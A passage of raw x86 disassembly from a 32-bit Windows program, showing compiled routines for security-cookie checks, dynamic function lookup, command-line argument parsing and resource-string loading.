  402b2f:	pop    ebp
  402b30:	ret    0x10
  402b33:	int3   
  402b34:	int3   
  402b35:	int3   
  402b36:	int3   
  402b37:	int3   
  402b38:	int3   
  402b39:	int3   
  402b3a:	int3   
  402b3b:	int3   
  402b3c:	int3   
  402b3d:	int3   
  402b3e:	int3   
  402b3f:	int3   
  402b40:	mov    DWORD PTR ds:0x4064e0,0x402c60
  402b4a:	mov    DWORD PTR ds:0x4064d8,0x402d50
  402b54:	mov    DWORD PTR ds:0x4064dc,0x402da0
  402b5e:	ret    
  402b5f:	int3   
  402b60:	mov    edi,edi
  402b62:	push   ebp
  402b63:	mov    ebp,esp
  402b65:	push   ecx
  402b66:	push   0x4020a4
  402b6b:	call   DWORD PTR ds:0x40709c
  402b71:	cmp    DWORD PTR ds:0x406500,0x0
  402b78:	mov    ds:0x40656c,eax
  402b7d:	jne    0x402ba6
  402b7f:	push   0xc
  402b81:	call   DWORD PTR ds:0x4070b8
  402b87:	mov    DWORD PTR [ebp-0x4],eax
  402b8a:	pop    ecx
  402b8b:	test   eax,eax
  402b8d:	je     0x402b9f
  402b8f:	and    DWORD PTR [eax+0x4],0x0
  402b93:	and    DWORD PTR [eax+0x8],0x0
  402b97:	mov    DWORD PTR [eax],0x401fe8
  402b9d:	jmp    0x402ba1
  402b9f:	xor    eax,eax
  402ba1:	mov    ds:0x406500,eax
  402ba6:	push   0x405700
  402bab:	call   0x404613
  402bb0:	pop    ecx
  402bb1:	mov    esp,ebp
  402bb3:	pop    ebp
  402bb4:	ret    
  402bb5:	int3   
  402bb6:	int3   
  402bb7:	int3   
  402bb8:	int3   
  402bb9:	int3   
  402bba:	int3   
  402bbb:	int3   
  402bbc:	int3   
  402bbd:	int3   
  402bbe:	int3   
  402bbf:	int3   
  402bc0:	push   0x406570
  402bc5:	call   DWORD PTR ds:0x407048
  402bcb:	push   0x405760
  402bd0:	call   0x404613
  402bd5:	pop    ecx
  402bd6:	ret    
  402bd7:	int3   
  402bd8:	int3   
  402bd9:	int3   
  402bda:	int3   
  402bdb:	int3   
  402bdc:	int3   
  402bdd:	int3   
  402bde:	int3   
  402bdf:	int3   
  402be0:	call   0x403a09
  402be5:	push   0x405780
  402bea:	mov    ds:0x406588,eax
  402bef:	call   0x404613
  402bf4:	pop    ecx
  402bf5:	ret    
  402bf6:	int3   
  402bf7:	int3   
  402bf8:	int3   
  402bf9:	int3   
  402bfa:	int3   
  402bfb:	int3   
  402bfc:	int3   
  402bfd:	int3   
  402bfe:	int3   
  402bff:	int3   
  402c00:	push   0x405790
  402c05:	call   0x404613
  402c0a:	pop    ecx
  402c0b:	ret    
  402c0c:	int3   
  402c0d:	int3   
  402c0e:	int3   
  402c0f:	int3   
  402c10:	push   0x4057a0
  402c15:	call   0x404613
  402c1a:	pop    ecx
  402c1b:	ret    
  402c1c:	int3   
  402c1d:	int3   
  402c1e:	int3   
  402c1f:	int3   
  402c20:	push   0x4057b0
  402c25:	call   0x404613
  402c2a:	pop    ecx
  402c2b:	ret    
  402c2c:	int3   
  402c2d:	int3   
  402c2e:	int3   
  402c2f:	int3   
  402c30:	int3   
  402c31:	int3   
  402c32:	int3   
  402c33:	int3   
  402c34:	int3   
  402c35:	int3   
  402c36:	int3   
  402c37:	int3   
  402c38:	int3   
  402c39:	int3   
  402c3a:	int3   
  402c3b:	int3   
  402c3c:	int3   
  402c3d:	int3   
  402c3e:	int3   
  402c3f:	int3   
  402c40:	mov    edi,edi
  402c42:	push   ebp
  402c43:	mov    ebp,esp
  402c45:	mov    eax,DWORD PTR [ebp+0x8]
  402c48:	mov    ds:0x4064f0,eax
  402c4d:	xor    eax,eax
  402c4f:	inc    eax
  402c50:	pop    ebp
  402c51:	ret    0x4
  402c54:	int3   
  402c55:	int3   
  402c56:	int3   
  402c57:	int3   
  402c58:	int3   
  402c59:	int3   
  402c5a:	int3   
  402c5b:	int3   
  402c5c:	int3   
  402c5d:	int3   
  402c5e:	int3   
  402c5f:	int3   
  402c60:	mov    edi,edi
  402c62:	push   ebp
  402c63:	mov    ebp,esp
  402c65:	sub    esp,0x10c
  402c6b:	mov    eax,ds:0x406004
  402c70:	xor    eax,ebp
  402c72:	mov    DWORD PTR [ebp-0x4],eax
  402c75:	cmp    BYTE PTR ds:0x4064ec,0x0
  402c7c:	push   edi
  402c7d:	mov    edi,0x406508
  402c82:	jne    0x402d2d
  402c88:	push   esi
  402c89:	push   0x40
  402c8b:	pop    esi
  402c8c:	push   esi
  402c8d:	push   0x0
  402c8f:	push   edi
  402c90:	call   0x40562a
  402c95:	and    DWORD PTR [ebp-0x10c],0x0
  402c9c:	lea    eax,[ebp-0x10c]
  402ca2:	add    esp,0xc
  402ca5:	push   eax
  402ca6:	push   0x402c40
  402cab:	push   0x6
  402cad:	call   DWORD PTR ds:0x407080
  402cb3:	test   eax,eax
  402cb5:	je     0x402d25
  402cb7:	push   0x104
  402cbc:	lea    eax,[ebp-0x108]
  402cc2:	push   eax
  402cc3:	push   DWORD PTR [ebp-0x10c]
  402cc9:	call   DWORD PTR ds:0x40708c
  402ccf:	test   eax,eax
  402cd1:	je     0x402d25
  402cd3:	lea    ecx,[ebp-0x108]
  402cd9:	lea    edx,[ecx+0x1]
  402cdc:	mov    al,BYTE PTR [ecx]
  402cde:	inc    ecx
  402cdf:	test   al,al
  402ce1:	jne    0x402cdc
  402ce3:	sub    ecx,edx
  402ce5:	lea    edx,[ebp-0x108]
  402ceb:	add    edx,ecx
  402ced:	jmp    0x402cf6
  402cef:	cmp    BYTE PTR [edx-0x1],0x5c
  402cf3:	je     0x402d00
  402cf5:	dec    edx
  402cf6:	lea    eax,[ebp-0x108]
  402cfc:	cmp    edx,eax
  402cfe:	ja     0x402cef
  402d00:	mov    ecx,edi
  402d02:	sub    edx,edi
  402d04:	lea    eax,[esi+0x7fffffbe]
  402d0a:	test   eax,eax
  402d0c:	je     0x402d1d
  402d0e:	mov    al,BYTE PTR [edx+ecx*1]
  402d11:	test   al,al
  402d13:	je     0x402d1d
  402d15:	mov    BYTE PTR [ecx],al
  402d17:	inc    ecx
  402d18:	sub    esi,0x1
  402d1b:	jne    0x402d04
  402d1d:	test   esi,esi
  402d1f:	jne    0x402d22
  402d21:	dec    ecx
  402d22:	mov    BYTE PTR [ecx],0x0
  402d25:	mov    BYTE PTR ds:0x4064ec,0x1
  402d2c:	pop    esi
  402d2d:	mov    ecx,DWORD PTR [ebp-0x4]
  402d30:	mov    eax,edi
  402d32:	xor    ecx,ebp
  402d34:	pop    edi
  402d35:	call   0x404560
  402d3a:	mov    esp,ebp
  402d3c:	pop    ebp
  402d3d:	ret    
  402d3e:	int3   
  402d3f:	int3   
  402d40:	int3   
  402d41:	int3   
  402d42:	int3   
  402d43:	int3   
  402d44:	int3   
  402d45:	int3   
  402d46:	int3   
  402d47:	int3   
  402d48:	int3   
  402d49:	int3   
  402d4a:	int3   
  402d4b:	int3   
  402d4c:	int3   
  402d4d:	int3   
  402d4e:	int3   
  402d4f:	int3   
  402d50:	mov    edi,edi
  402d52:	push   ebp
  402d53:	mov    ebp,esp
  402d55:	push   ecx
  402d56:	mov    eax,ds:0x406004
  402d5b:	xor    eax,ebp
  402d5d:	mov    DWORD PTR [ebp-0x4],eax
  402d60:	push   0x401f74
  402d65:	call   DWORD PTR ds:0x407084
  402d6b:	test   eax,eax
  402d6d:	je     0x402d8d
  402d6f:	push   esi
  402d70:	push   0x401f88
  402d75:	push   eax
  402d76:	call   DWORD PTR ds:0x407088
  402d7c:	mov    esi,eax
  402d7e:	test   esi,esi
  402d80:	je     0x402d8c
  402d82:	mov    ecx,esi
  402d84:	call   DWORD PTR ds:0x40717c
  402d8a:	call   esi
  402d8c:	pop    esi
  402d8d:	mov    ecx,DWORD PTR [ebp-0x4]
  402d90:	xor    ecx,ebp
  402d92:	call   0x404560
  402d97:	mov    esp,ebp
  402d99:	pop    ebp
  402d9a:	ret    
  402d9b:	int3   
  402d9c:	int3   
  402d9d:	int3   
  402d9e:	int3   
  402d9f:	int3   
  402da0:	mov    edi,edi
  402da2:	push   ebp
  402da3:	mov    ebp,esp
  402da5:	push   ecx
  402da6:	mov    eax,ds:0x406004
  402dab:	xor    eax,ebp
  402dad:	mov    DWORD PTR [ebp-0x4],eax
  402db0:	push   esi
  402db1:	mov    esi,DWORD PTR ds:0x4064e8
  402db7:	push   edi
  402db8:	test   esi,esi
  402dba:	jne    0x402df5
  402dbc:	mov    eax,ds:0x4064e4
  402dc1:	xor    edi,edi
  402dc3:	test   eax,eax
  402dc5:	jne    0x402ddd
  402dc7:	push   0x800
  402dcc:	push   edi
  402dcd:	push   0x401f74
  402dd2:	call   DWORD PTR ds:0x40707c
  402dd8:	mov    ds:0x4064e4,eax
  402ddd:	push   0x401fa4
  402de2:	push   eax
  402de3:	call   DWORD PTR ds:0x407088
  402de9:	mov    esi,eax
  402deb:	mov    DWORD PTR ds:0x4064e8,esi
  402df1:	test   esi,esi
  402df3:	je     0x402e04
  402df5:	push   DWORD PTR [ebp+0x8]
  402df8:	mov    ecx,esi
  402dfa:	call   DWORD PTR ds:0x40717c
  402e00:	call   esi
  402e02:	mov    edi,eax
  402e04:	mov    ecx,DWORD PTR [ebp-0x4]
  402e07:	mov    eax,edi
  402e09:	pop    edi
  402e0a:	xor    ecx,ebp
  402e0c:	pop    esi
  402e0d:	call   0x404560
  402e12:	mov    esp,ebp
  402e14:	pop    ebp
  402e15:	ret    0x4
  402e18:	int3   
  402e19:	int3   
  402e1a:	int3   
  402e1b:	int3   
  402e1c:	int3   
  402e1d:	mov    edi,edi
  402e1f:	push   ebp
  402e20:	mov    ebp,esp
  402e22:	push   esi
  402e23:	push   edi
  402e24:	mov    edi,ecx
  402e26:	mov    esi,edx
  402e28:	test   edi,edi
  402e2a:	jne    0x402e33
  402e2c:	xor    eax,eax
  402e2e:	jmp    0x402ec8
  402e33:	push   ebx
  402e34:	push   DWORD PTR [ebp+0x10]
  402e37:	mov    eax,esi
  402e39:	and    esi,0xf
  402e3c:	sar    eax,0x4
  402e3f:	inc    eax
  402e40:	movzx  ebx,ax
  402e43:	push   ebx
  402e44:	push   0x6
  402e46:	push   edi
  402e47:	call   DWORD PTR ds:0x407090
  402e4d:	test   eax,eax
  402e4f:	jne    0x402e6b
  402e51:	mov    eax,0x400
  402e56:	cmp    WORD PTR [ebp+0x10],ax
  402e5a:	je     0x402e84
  402e5c:	push   eax
  402e5d:	push   ebx
  402e5e:	push   0x6
  402e60:	push   edi
  402e61:	call   DWORD PTR ds:0x407090
  402e67:	test   eax,eax
  402e69:	je     0x402e84
  402e6b:	push   eax
  402e6c:	push   edi
  402e6d:	call   DWORD PTR ds:0x407094
  402e73:	test   eax,eax
  402e75:	je     0x402e84
  402e77:	push   eax
  402e78:	call   DWORD PTR ds:0x407098
  402e7e:	mov    ecx,eax
  402e80:	test   ecx,ecx
  402e82:	jne    0x402e88
  402e84:	xor    eax,eax
  402e86:	jmp    0x402ec7
  402e88:	test   esi,esi
  402e8a:	je     0x402e9a
  402e8c:	movzx  eax,WORD PTR [ecx]
  402e8f:	lea    ecx,[ecx+eax*2]
  402e92:	add    ecx,0x2
  402e95:	sub    esi,0x1
  402e98:	jne    0x402e8c
  402e9a:	mov    ebx,DWORD PTR [ebp+0x8]
  402e9d:	movzx  edi,WORD PTR [ecx]
  402ea0:	test   ebx,ebx
  402ea2:	je     0x402ec5
  402ea4:	mov    eax,DWORD PTR [ebp+0xc]
  402ea7:	dec    eax
  402ea8:	cmp    edi,eax
  402eaa:	jb     0x402eae
  402eac:	mov    edi,eax
  402eae:	lea    esi,[edi+edi*1]
  402eb1:	add    ecx,0x2
  402eb4:	push   esi
  402eb5:	push   ecx
  402eb6:	push   ebx
  402eb7:	call   0x40561e
  402ebc:	add    esp,0xc
  402ebf:	xor    eax,eax
  402ec1:	mov    WORD PTR [esi+ebx*1],ax
  402ec5:	mov    eax,edi
  402ec7:	pop    ebx
  402ec8:	pop    edi
  402ec9:	pop    esi
  402eca:	pop    ebp
  402ecb:	ret    0xc
  402ece:	int3   
  402ecf:	int3   
  402ed0:	int3   
  402ed1:	int3   
  402ed2:	int3   
  402ed3:	mov    edi,edi
  402ed5:	push   ebp
  402ed6:	mov    ebp,esp
  402ed8:	and    esp,0xfffffff8
  402edb:	sub    esp,0x344
  402ee1:	mov    eax,ds:0x406004
  402ee6:	xor    eax,esp
  402ee8:	mov    DWORD PTR [esp+0x340],eax
  402eef:	mov    eax,DWORD PTR [ebp+0x8]
  402ef2:	push   ebx
  402ef3:	push   esi
  402ef4:	push   edi
  402ef5:	push   0x4020dc
  402efa:	mov    DWORD PTR [esp+0x20],eax
  402efe:	call   DWORD PTR ds:0x407084
  402f04:	test   eax,eax
  402f06:	je     0x402f26
  402f08:	push   0x4020f0
  402f0d:	push   eax
  402f0e:	call   DWORD PTR ds:0x407088
  402f14:	mov    esi,eax
  402f16:	test   esi,esi
  402f18:	je     0x402f26
  402f1a:	push   0x1
  402f1c:	mov    ecx,esi
  402f1e:	call   DWORD PTR ds:0x40717c
  402f24:	call   esi
  402f26:	call   0x403f31
  402f2b:	test   eax,eax
  402f2d:	je     0x403053
  402f33:	call   0x403f07
  402f38:	test   eax,eax
  402f3a:	je     0x403053
  402f40:	lea    eax,[esp+0x10]
  402f44:	xor    edi,edi
  402f46:	push   eax
  402f47:	push   ecx
  402f48:	push   ecx
  402f49:	mov    ebx,0x411
  402f4e:	mov    DWORD PTR [esp+0x1c],edi
  402f52:	call   0x403c26
  402f57:	mov    ecx,DWORD PTR [esp+0x10]
  402f5b:	test   ecx,ecx
  402f5d:	je     0x402fca
  402f5f:	mov    DWORD PTR [esp+0xc],edi
  402f63:	lea    edx,[esp+0xc]
  402f67:	mov    eax,DWORD PTR [ecx]
  402f69:	push   edx
  402f6a:	push   ecx
  402f6b:	mov    esi,DWORD PTR [eax+0x94]
  402f71:	mov    ecx,esi
  402f73:	call   DWORD PTR ds:0x40717c
  402f79:	call   esi
  402f7b:	mov    ecx,DWORD PTR [esp+0xc]
  402f7f:	test   ecx,ecx
  402f81:	je     0x402fb6
  402f83:	mov    eax,DWORD PTR [ecx]
  402f85:	lea    edx,[esp+0x14]
  402f89:	push   edx
  402f8a:	push   ecx
  402f8b:	mov    esi,DWORD PTR [eax+0x20]
  402f8e:	mov    ecx,esi
  402f90:	call   DWORD PTR ds:0x40717c
  402f96:	call   esi
  402f98:	mov    eax,DWORD PTR [esp+0xc]
  402f9c:	push   eax
  402f9d:	mov    ecx,DWORD PTR [eax]
  402f9f:	mov    esi,DWORD PTR [ecx+0x8]
  402fa2:	mov    ecx,esi
  402fa4:	call   DWORD PTR ds:0x40717c
  402faa:	call   esi
  402fac:	cmp    DWORD PTR [esp+0x14],0x1
  402fb1:	jne    0x402fb6
  402fb3:	add    ebx,0xfffffff8
  402fb6:	mov    eax,DWORD PTR [esp+0x10]
  402fba:	push   eax
  402fbb:	mov    ecx,DWORD PTR [eax]
  402fbd:	mov    esi,DWORD PTR [ecx+0x8]
  402fc0:	mov    ecx,esi
  402fc2:	call   DWORD PTR ds:0x40717c
  402fc8:	call   esi
  402fca:	xor    eax,eax
  402fcc:	push   0xc6
  402fd1:	mov    WORD PTR [esp+0x2c],ax
  402fd6:	lea    eax,[esp+0x2e]
  402fda:	push   edi
  402fdb:	push   eax
  402fdc:	call   0x40562a
  402fe1:	add    esp,0xc
  402fe4:	xor    eax,eax
  402fe6:	mov    WORD PTR [esp+0xf0],ax
  402fee:	lea    eax,[esp+0xf2]
  402ff5:	push   0x256
  402ffa:	push   edi
  402ffb:	push   eax
  402ffc:	call   0x40562a
  403001:	mov    ecx,DWORD PTR [esp+0x28]
  403005:	lea    eax,[esp+0x34]
  403009:	add    esp,0xc
  40300c:	mov    edx,0x14b4
  403011:	push   ebx
  403012:	push   0x64
  403014:	push   eax
  403015:	call   0x402e1d
  40301a:	mov    ecx,DWORD PTR [esp+0x1c]
  40301e:	lea    eax,[esp+0xf0]
  403025:	push   ebx
  403026:	push   0x12c
  40302b:	push   eax
  40302c:	mov    edx,0x14b5
  403031:	call   0x402e1d
  403036:	push   edi
  403037:	lea    eax,[esp+0x2c]
  40303b:	push   eax
  40303c:	lea    eax,[esp+0xf8]
  403043:	push   eax
  403044:	push   edi
  403045:	call   DWORD PTR ds:0x4070d0
  40304b:	or     eax,0xffffffff
  40304e:	jmp    0x4031a0
  403053:	call   DWORD PTR ds:0x4070cc
  403059:	xor    edi,edi
  40305b:	push   edi
  40305c:	call   DWORD PTR ds:0x407170
  403062:	xor    ecx,ecx
  403064:	test   eax,eax
  403066:	push   0x402018
  40306b:	setns  cl
  40306e:	mov    DWORD PTR [esp+0x28],ecx
  403072:	call   DWORD PTR ds:0x40709c
  403078:	mov    ebx,eax
  40307a:	mov    DWORD PTR [esp+0x20],ebx
  40307e:	test   ebx,ebx
  403080:	je     0x403186
  403086:	push   0x402034
  40308b:	push   ebx
  40308c:	call   DWORD PTR ds:0x407088
  403092:	mov    esi,eax
  403094:	mov    DWORD PTR [esp+0x14],esi
  403098:	test   esi,esi
  40309a:	je     0x403186
  4030a0:	lea    eax,[esp+0x18]
  4030a4:	mov    DWORD PTR [esp+0x18],edi
  4030a8:	push   eax
  4030a9:	call   DWORD PTR ds:0x4070a0
  4030af:	push   eax
  4030b0:	call   DWORD PTR ds:0x4070c4
  4030b6:	mov    ebx,eax
  4030b8:	mov    DWORD PTR [esp+0xc],edi
  4030bc:	mov    ecx,edi
  4030be:	mov    DWORD PTR [esp+0x10],ecx
  4030c2:	test   ebx,ebx
  4030c4:	je     0x40315b
  4030ca:	xor    esi,esi
  4030cc:	inc    esi
  4030cd:	cmp    DWORD PTR [esp+0x18],esi
  4030d1:	jle    0x40314c
  4030d3:	push   0x40203c
  4030d8:	push   DWORD PTR [ebx+esi*4]
  4030db:	call   DWORD PTR ds:0x4070a4
  4030e1:	test   eax,eax
  4030e3:	je     0x4030f7
  4030e5:	push   0x402044
  4030ea:	push   DWORD PTR [ebx+esi*4]
  4030ed:	call   DWORD PTR ds:0x4070a4
  4030f3:	test   eax,eax
  4030f5:	jne    0x4030ff
  4030f7:	mov    DWORD PTR [esp+0xc],0x1
  4030ff:	push   0x40204c
  403104:	push   DWORD PTR [ebx+esi*4]
  403107:	call   DWORD PTR ds:0x4070a4
  40310d:	test   eax,eax
  40310f:	je     0x403123
  403111:	push   0x402054
  403116:	push   DWORD PTR [ebx+esi*4]
  403119:	call   DWORD PTR ds:0x4070a4
  40311f:	test   eax,eax
  403121:	jne    0x40312b
  403123:	mov    DWORD PTR [esp+0x10],0x1
  40312b:	push   0x40205c
  403130:	push   DWORD PTR [ebx+esi*4]
  403133:	call   DWORD PTR ds:0x407110
  403139:	pop    ecx
  40313a:	pop    ecx
  40313b:	test   eax,eax
  40313d:	jne    0x403145
  40313f:	push   ecx
  403140:	call   0x403644
  403145:	inc    esi
  403146:	cmp    esi,DWORD PTR [esp+0x18]
  40314a:	jl     0x4030d3
  40314c:	push   ebx
  40314d:	call   DWORD PTR ds:0x4070b0
  403153:	mov    esi,DWORD PTR [esp+0x14]
  403157:	mov    ecx,DWORD PTR [esp+0x10]
  40315b:	mov    eax,edi
  40315d:	cmp    DWORD PTR [esp+0xc],eax
  403161:	je     0x403167
  403163:	push   0x2
  403165:	jmp    0x40316d
  403167:	test   ecx,ecx
  403169:	je     0x40316e
  40316b:	push   0x5
  40316d:	pop    eax
  40316e:	push   edi
  40316f:	push   eax
  403170:	push   edi
  403171:	push   edi
  403172:	push   DWORD PTR [esp+0x2c]
  403176:	mov    ecx,esi
  403178:	call   DWORD PTR ds:0x40717c
  40317e:	call   esi
  403180:	mov    ebx,DWORD PTR [esp+0x20]
  403184:	mov    edi,eax
  403186:	cmp    DWORD PTR [esp+0x24],0x0
  40318b:	je     0x403193
  40318d:	call   DWORD PTR ds:0x40716c
  403193:	test   ebx,ebx
  403195:	je     0x40319e
  403197:	push   ebx
  403198:	call   DWORD PTR ds:0x407034
  40319e:	mov    eax,edi
  4031a0:	mov    ecx,DWORD PTR [esp+0x34c]
  4031a7:	pop    edi
  4031a8:	pop    esi
  4031a9:	pop    ebx
  4031aa:	xor    ecx,esp
  4031ac:	call   0x404560
  4031b1:	mov    esp,ebp
  4031b3:	pop    ebp
  4031b4:	ret    0x10
  4031b7:	int3   
  4031b8:	int3   
  4031b9:	int3   
  4031ba:	int3   
  4031bb:	int3   
  4031bc:	int3   
  4031bd:	int3   
  4031be:	int3   
  4031bf:	int3   
  4031c0:	mov    edi,edi
  4031c2:	push   ebp
  4031c3:	mov    ebp,esp
  4031c5:	push   esi
  4031c6:	mov    esi,ecx
  4031c8:	call   0x403617
  4031cd:	test   BYTE PTR [ebp+0x8],0x1
  4031d1:	je     0x4031db
  4031d3:	push   esi
  4031d4:	call   DWORD PTR ds:0x4070bc
  4031da:	pop    ecx
  4031db:	mov    eax,esi
  4031dd:	pop    esi
  4031de:	pop    ebp
  4031df:	ret    0x4
  4031e2:	int3   
  4031e3:	int3   
  4031e4:	int3   
  4031e5:	int3   
  4031e6:	int3   
  4031e7:	int3   
  4031e8:	int3   
  4031e9:	int3   
  4031ea:	int3   
  4031eb:	int3   
  4031ec:	int3   
  4031ed:	int3   
  4031ee:	int3   
  4031ef:	int3   
  4031f0:	mov    edi,edi
  4031f2:	push   ebp
  4031f3:	mov    ebp,esp
  4031f5:	push   ecx
  4031f6:	mov    eax,ds:0x406004
  4031fb:	xor    eax,ebp
  4031fd:	mov    DWORD PTR [ebp-0x4],eax
  403200:	push   esi
  403201:	mov    esi,DWORD PTR [ebp+0x8]
  403204:	push   edi
  403205:	mov    edi,ecx
  403207:	mov    edx,DWORD PTR [esi+0x8]
  40320a:	cmp    DWORD PTR ds:0x406048,edx
  403210:	mov    DWORD PTR ds:0x406048,edx
  403216:	sete   al
  403219:	test   al,al
  40321b:	jne    0x403231
  40321d:	mov    eax,DWORD PTR [edi]
  40321f:	push   esi
  403220:	push   0x0
  403222:	mov    esi,DWORD PTR [eax+0x8]
  403225:	mov    ecx,esi
  403227:	call   DWORD PTR ds:0x40717c
  40322d:	mov    ecx,edi
  40322f:	call   esi
  403231:	mov    ecx,DWORD PTR [ebp-0x4]
  403234:	mov    al,0x1
  403236:	pop    edi
  403237:	xor    ecx,ebp
  403239:	pop    esi
  40323a:	call   0x404560
  40323f:	mov    esp,ebp
  403241:	pop    ebp
  403242:	ret    0x4
  403245:	int3   
  403246:	int3   
  403247:	int3   
  403248:	int3   
  403249:	int3   
  40324a:	int3   
  40324b:	int3   
  40324c:	int3   
  40324d:	int3   
  40324e:	int3   
  40324f:	int3   
  403250:	ret    
  403251:	int3   
  403252:	int3   
  403253:	int3   
  403254:	int3   
  403255:	int3   
  403256:	mov    edi,edi
  403258:	push   ebp
  403259:	mov    ebp,esp
  40325b:	sub    esp,0x120
  403261:	mov    eax,ds:0x406004
  403266:	xor    eax,ebp
  403268:	mov    DWORD PTR [ebp-0x8],eax
  40326b:	push   ebx
  40326c:	push   esi
  40326d:	mov    esi,DWORD PTR [ecx+0x4]
  403270:	push   edi
  403271:	mov    edi,DWORD PTR [ebp+0x8]
  403274:	cmp    DWORD PTR [esi],0x5
  403277:	jbe    0x4033dc
  40327d:	push   0x2000
  403282:	push   0x0
  403284:	mov    ecx,esi
  403286:	call   0x402a3a
  40328b:	test   al,al
  40328d:	je     0x4033dc
  403293:	mov    eax,DWORD PTR [edi+0x4]
  403296:	lea    ecx,[ebp-0xdc]
  40329c:	mov    edx,DWORD PTR [edi+0x1c]
  40329f:	and    DWORD PTR [ebp-0xe8],0x0
  4032a6:	and    DWORD PTR [ebp-0xe0],0x0
  4032ad:	push   0x4
  4032af:	mov    DWORD PTR [ebp-0x11c],eax
  4032b5:	lea    eax,[ebp-0x11c]
  4032bb:	pop    ebx
  4032bc:	mov    DWORD PTR [ebp-0xec],eax
  4032c2:	mov    DWORD PTR [ebp-0xe4],ebx
  4032c8:	call   0x402a74
  4032cd:	mov    edx,DWORD PTR [edi+0x44]
  4032d0:	lea    eax,[edi+0x20]
  4032d3:	and    DWORD PTR [ebp-0xc8],0x0
  4032da:	lea    ecx,[ebp-0xbc]
  4032e0:	and    DWORD PTR [ebp-0xc0],0x0
  4032e7:	mov    DWORD PTR [ebp-0xcc],eax
  4032ed:	mov    DWORD PTR [ebp-0xc4],ebx
  4032f3:	call   0x402a74
  4032f8:	mov    eax,DWORD PTR [edi]
  4032fa:	lea    ecx,[ebp-0x9c]
  403300:	mov    edx,DWORD PTR [edi+0xc]
  403303:	and    DWORD PTR [ebp-0xa8],0x0
  40330a:	and    DWORD PTR [ebp-0xa0],0x0
  403311:	mov    DWORD PTR [ebp-0x120],eax
  403317:	lea    eax,[ebp-0x120]
  40331d:	mov    DWORD PTR [ebp-0xac],eax
  403323:	mov    DWORD PTR [ebp-0xa4],ebx
  403329:	call   0x4029f7
  40332e:	mov    eax,DWORD PTR [edi+0x10]
  403331:	lea    ecx,[ebp-0x7c]
  403334:	mov    edx,DWORD PTR [edi+0x28]
  403337:	and    DWORD PTR [ebp-0x88],0x0
  40333e:	and    DWORD PTR [ebp-0x80],0x0
  403342:	mov    DWORD PTR [ebp-0x110],eax
  403348:	lea    eax,[ebp-0x110]
  40334e:	mov    DWORD PTR [ebp-0x8c],eax
  403354:	mov    DWORD PTR [ebp-0x84],ebx
  40335a:	call   0x402a74
  40335f:	mov    eax,DWORD PTR [edi+0x2c]
  403362:	lea    ecx,[ebp-0x5c]
  403365:	mov    edx,DWORD PTR [edi+0x30]
  403368:	and    DWORD PTR [ebp-0x68],0x0
  40336c:	and    DWORD PTR [ebp-0x60],0x0
  403370:	mov    DWORD PTR [ebp-0x114],eax
  403376:	lea    eax,[ebp-0x114]
  40337c:	mov    DWORD PTR [ebp-0x6c],eax
  40337f:	mov    DWORD PTR [ebp-0x64],ebx
  403382:	call   0x402a74
  403387:	mov    edx,DWORD PTR [edi+0x34]
  40338a:	lea    ecx,[ebp-0x4c]
  40338d:	call   0x4029f7
  403392:	mov    eax,DWORD PTR [edi+0x38]
  403395:	lea    ecx,[ebp-0x2c]
  403398:	mov    edx,DWORD PTR [edi+0x3c]
  40339b:	and    DWORD PTR [ebp-0x38],0x0
  40339f:	and    DWORD PTR [ebp-0x30],0x0
  4033a3:	mov    DWORD PTR [ebp-0x118],eax
  4033a9:	lea    eax,[ebp-0x118]
  4033af:	mov    DWORD PTR [ebp-0x3c],eax
  4033b2:	mov    DWORD PTR [ebp-0x34],ebx
  4033b5:	call   0x402a74
  4033ba:	mov    edx,DWORD PTR [edi+0x40]
  4033bd:	lea    ecx,[ebp-0x1c]
  4033c0:	call   0x4029f7
  4033c5:	lea    eax,[ebp-0x10c]
  4033cb:	mov    edx,0x4023b1
  4033d0:	push   eax
  4033d1:	push   0x10
  4033d3:	push   ecx
  4033d4:	push   ecx
  4033d5:	mov    ecx,esi
  4033d7:	call   0x402aab
  4033dc:	mov    ecx,DWORD PTR [ebp-0x8]
  4033df:	pop    edi
  4033e0:	pop    esi
  4033e1:	xor    ecx,ebp
  4033e3:	pop    ebx
  4033e4:	call   0x404560
  4033e9:	mov    esp,ebp
  4033eb:	pop    ebp
  4033ec:	ret    0x4
  4033ef:	int3   
  4033f0:	int3   
  4033f1:	int3   
  4033f2:	int3   
  4033f3:	int3   
  4033f4:	mov    edi,edi
  4033f6:	push   ebp
  4033f7:	mov    ebp,esp
  4033f9:	sub    esp,0x158
  4033ff:	mov    eax,ds:0x406004
  403404:	xor    eax,ebp
  403406:	mov    DWORD PTR [ebp-0x8],eax
  403409:	push   ebx
  40340a:	push   esi
  40340b:	mov    esi,DWORD PTR [ebp+0x8]
  40340e:	push   edi
  40340f:	mov    edi,DWORD PTR [ecx+0x4]
  403412:	cmp    DWORD PTR [edi],0x5
  403415:	jbe    0x4035bc
  40341b:	mov    eax,DWORD PTR [esi+0x4]
  40341e:	lea    ecx,[ebp-0x10c]
  403424:	mov    edx,DWORD PTR [esi+0x1c]
  403427:	and    DWORD PTR [ebp-0x118],0x0
  40342e:	and    DWORD PTR [ebp-0x110],0x0
  403435:	push   0x4
  403437:	mov    DWORD PTR [ebp-0x14c],eax
  40343d:	lea    eax,[ebp-0x14c]
  403443:	pop    ebx
  403444:	mov    DWORD PTR [ebp-0x11c],eax
  40344a:	mov    DWORD PTR [ebp-0x114],ebx
  403450:	call   0x402a74
  403455:	mov    edx,DWORD PTR [esi+0x44]
  403458:	lea    eax,[esi+0x20]
  40345b:	and    DWORD PTR [ebp-0xf8],0x0
  403462:	lea    ecx,[ebp-0xec]
  403468:	and    DWORD PTR [ebp-0xf0],0x0
  40346f:	mov    DWORD PTR [ebp-0xfc],eax
  403475:	mov    DWORD PTR [ebp-0xf4],ebx
  40347b:	call   0x402a74
  403480:	mov    eax,DWORD PTR [esi]
  403482:	lea    ecx,[ebp-0xcc]
  403488:	mov    edx,DWORD PTR [esi+0xc]
  40348b:	and    DWORD PTR [ebp-0xd8],0x0
  403492:	and    DWORD PTR [ebp-0xd0],0x0
  403499:	mov    DWORD PTR [ebp-0x158],eax
  40349f:	lea    eax,[ebp-0x158]
  4034a5:	mov    DWORD PTR [ebp-0xdc],eax
  4034ab:	mov    DWORD PTR [ebp-0xd4],ebx
  4034b1:	call   0x4029f7
  4034b6:	mov    eax,DWORD PTR [esi+0x10]
  4034b9:	lea    ecx,[ebp-0xac]
  4034bf:	mov    edx,DWORD PTR [esi+0x28]
  4034c2:	and    DWORD PTR [ebp-0xb8],0x0
  4034c9:	and    DWORD PTR [ebp-0xb0],0x0
  4034d0:	mov    DWORD PTR [ebp-0x154],eax
  4034d6:	lea    eax,[ebp-0x154]
